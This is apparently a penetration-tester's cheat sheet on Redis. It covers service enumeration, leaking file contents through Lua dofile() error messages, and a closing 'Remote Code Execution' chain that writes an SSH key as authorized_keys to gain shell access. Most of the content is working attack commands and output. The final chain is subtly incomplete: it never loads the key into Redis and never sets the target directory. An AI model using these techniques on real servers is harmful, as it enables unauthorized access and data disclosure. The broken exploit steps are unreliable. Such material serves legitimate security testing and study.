# Redis Enumeration Tools

### Nmap Enumeration
```
$ ls -lh /usr/share/nmap/scripts | grep redis
-rw-r--r-- 1 root root 2.8K Oct 12 09:29 redis-brute.nse
-rw-r--r-- 1 root root 6.9K Oct 12 09:29 redis-info.nse
```

```
$ nmap x.x.x.x -v -p 6379 --script=exampleScript1.nse,exampleScript2.nse
```

### Manual Connnection
```
$ telnet x.x.x.x 6379 
```

### echo test
```
$ telnet x.x.x.x 6379                                
Trying x.x.x.x...
Connected to x.x.x.x.
Escape character is '^]'.
echo test
$4
test
echo testing123
$10
testing123
echo "test"
$6
"test"
```

### redis-cli
```shell
> redis-cli -h x.x.x.x
x.x.x.x:6379> info                                  
# Server                                                 
redis_version:2.6.14                                     
redis_git_sha1:00000000                                  
redis_git_dirty:0                                        
redis_mode:standalone                                    
os:Linux 4.4.0-21-generic x86_64                                                                                  
arch_bits:64                                             
multiplexing_api:epoll                                   
gcc_version:5.3.1                                        
process_id:758                                           
run_id:ccdee3d16473ba7714fd06abd555f7dbaac5da3f                                                                   
tcp_port:6379                                            
uptime_in_seconds:1249993                                
uptime_in_days:14                                        
hz:10                                                    
lru_clock:312404 
```

Other enumeration commands:
`CONFIG GET pidfile`
`CONFIG GET dir`
`CONFIG GET dbfilename`
`CONFIG GET logfile`

### lua scripts

Redis can execute sandboxed Lua scripts through the "EVAL" command. `dofile()` is a command that can be used to enumerate files and directories; in older Redis version it is allowed by the sandbox.

Within redis-cli:
`EVAL "dofile('/var/')" 0`
- should return something like: `(error) ERR Error running script (call to f_de02e3f8f35b9def4742c4d51dd5b0e3e4b033e5): cannot read /var/: Is a directory ` confirming the directory exists. If not, the error would be "no such file or directory"

If the Lua script is syntactically invalid or tries to set global variables, some content of the target file will be leaked through the error messages. 

Examples:

```
EVAL "dofile('/etc/issue')" 0
(error) ERR Error running script (call to f_8a4872e08ffe0c2c5eda1751de819afe587ef07a): /etc/issue:1: '=' expected near '16.04' 
```
and
```
EVAL "dofile('/etc/lsb-release')" 0
(error) ERR Error running script (call to f_d486d29ccf27cca592a28676eba9fa49c0a02f08): /etc/lsb-release:1: Script attempted to access unexisting global variable 'Ubuntu' 
```
That gives us the info we're likely dealing with an ubuntu 16.04 machine. 

You can also interact with redis with curl and gopher:
```
# curl gopher://x.x.x.x:6379/_CONFIG%20GET%20dir --max-time 1
```

### Remote Code Execution
Source: https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html

Generate an ssh key:
```
$ ssh-keygen -t rsa -C "crack@redis.io"
$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
```

Connect to redis and find a user directory with .ssh directory:
```shell
redis-cli -h x.x.x.x
x.x.x.x:6379> EVAL "dofile('/home/')" 0
(error) ERR Error running script (call to f_351f13c20f479b8ac8bde46fdc9b831d3b093b44): @user_script:1: cannot read /home/: Is a directory
x.x.x.x:6379> EVAL "dofile('/home/user/.ssh')" 0
(error) ERR Error running script (call to f_1508eef1e3b382e49753c37a8f507f0eb65ab351): @user_script:1: cannot read /home/user/.ssh: Is a directory 
```

Then write the authorized keys file and save:
```shell
x.x.x.x:6379> config set dbfilename "authorized_keys"
OK
x.x.x.x:6379> save
OK
```

Then connect via ssh:
```shell
ssh -i id_rsa user@x.x.x.x
```